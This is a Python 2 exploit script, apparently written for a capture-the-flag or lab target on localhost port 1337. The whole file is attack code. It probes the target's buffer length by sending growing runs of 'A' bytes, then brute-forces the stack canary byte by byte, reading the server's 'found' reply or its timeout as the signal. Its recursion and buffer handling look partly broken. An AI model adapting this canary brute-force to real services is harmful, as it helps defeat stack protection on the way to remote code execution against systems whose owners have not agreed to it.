#!/usr/bin/python
import socket 
import sys 

TIMEOUT = .1
SERVERREPLY = "found"

host = "127.0.0.1"
port = 1337

#To exploit the buff 
buff = ""
num=0

#To find the length of the buffer
findLenBuff = ""

#to find offset
offset =0

def initAgain():
	global buff
	buff = "A" * offset 
	print buff
	print offset
	findCanary()

def findCanary():
	global buff
	global offset

	for i in range(0,256):
		try:	
			s = socket.socket()
			s.settimeout(TIMEOUT)	
			
			print "loop value: " + str (i) +" in hex: "+str(hex(i))	

			s.connect((host,port))
			buff +=  chr(i)
			
			if len(buff) == (offset+20):
				print "*******************************"
				print "P4nd the canary "
				for c in buff:
					print "%#x" % ord(c),					

				sys.exit()
				break

			print buff
			print (len(buff))
			s.send(buff)
			
			buff = buff[:-1]

			data = s.recv(20)
			if data == "found":
				print "*************************Server Alive**************************************"
				print "buff value is " + buff
				buff+=chr(i) #write value twice because the one char will be removed in the end
				findCanary()
	
			else:
				print "*************************Server Dead**************************************"
			
		except socket.timeout, e:
			err = e.args[0]
			# this next if/else is a bit redundant, but illustrates how the
			# timeout exception is setup
			if err == 'timed out':
				print "*************************Not a canary stack**************************************"
		
				continue
			else:
			    print e
			   
		except socket.error, e:
		# Something else happened, handle error, exit, etc.
			print e
		
		except KeyboardInterrupt:
			print "********* Okay.. here is the stat so far **************"
			print "buffer length is: " + str(len(buff))
			print "buffer is "
			for c in buff:
					print "%#x" % ord(c),
			exit(1)

def findBuffLength():
	
	global findLenBuff
	global buff
	global offset 

	for i in range(0,256):
			try:	
				s = socket.socket()
				s.settimeout(TIMEOUT)
	

				s.connect((host,port))
				findLenBuff +=  chr(0x41)
			
				print len(findLenBuff)
				s.send(findLenBuff)

				data = s.recv(20)
				print ("data: " + data) 
				print ("Server reply: " +SERVERREPLY)
				if data == SERVERREPLY:
					print "************************* Server Alive***********************************"

					findLenBuff+=chr(0x41)
 
					findBuffLength()	
			
				else:
					print "Server died "
			
			except socket.timeout, e:
				err = e.args[0]
				# this next if/else is a bit redundant, but illustrates how the
				# timeout exception is setup
				if err == 'timed out':
					print "************************* Server - Timeout********************************"
					print "buffer length is: " + str(len(findLenBuff)-1)
					offset = (len(findLenBuff)-1)
					initAgain()
				else:
				    print e
				   
			except socket.error, e:
			# Something else happened, handle error, exit, etc.
				print e

if __name__=="__main__":
	findBuffLength()	
